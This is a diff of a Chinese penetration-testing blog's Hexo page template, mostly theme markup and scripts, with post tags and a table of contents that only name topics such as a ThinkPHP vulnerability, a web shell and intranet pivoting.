-<!-- Custom -->
-
 
     
-
     
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
     
 
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ThinkPHP%E6%BC%8F%E6%B4%9E/" rel="tag"># ThinkPHP漏洞</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/13/Forensics/mimikatz/" rel="prev" title="Mimikatz离线破解Windows登陆密码">
+      <i class="fa fa-chevron-left"></i> Mimikatz离线破解Windows登陆密码
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/05/IoTSecurity/IoT-vulhub/" rel="next" title="路由器漏洞环境仿真">
+      路由器漏洞环境仿真 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
   </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E4%B8%80%E5%8F%A5%E8%AF%9DShell"><span class="nav-number">4.</span> <span class="nav-text">0x03 一句话Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%86%B0%E8%9D%8E-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">5.</span> <span class="nav-text">0x04 冰蝎 内网渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7%E7%BB%84%E5%90%88%E6%8B%B3"><span class="nav-number">6.</span> <span class="nav-text">0x05 向日葵远控组合拳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F"><span class="nav-number">7.</span> <span class="nav-text">0x06 利用成功</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">VxerLee</p>
+  <div class="site-description" itemprop="description">喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot</div>
 </div>
-    
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
 
-    
-  </main>
 
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">VxerLee</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
-  
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
 
   
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-  
-</footer>
+<script src="/js/utils.js"></script>
 
-
-  <!-- SCRIPTS -->
-  
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+<script src="/js/motion.js"></script>
 
 
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
+<script src="/js/schemes/muse.js"></script>
 
 
-  <script  src="/js/local-search.js" ></script>
+<script src="/js/next-boot.js"></script>
 
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
 
 
 
@@ -477,52 +465,21 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
   
-    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+
   
-  
-    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
-  
-  
-    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
-  
-
-
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
 
 </body>
 </html>
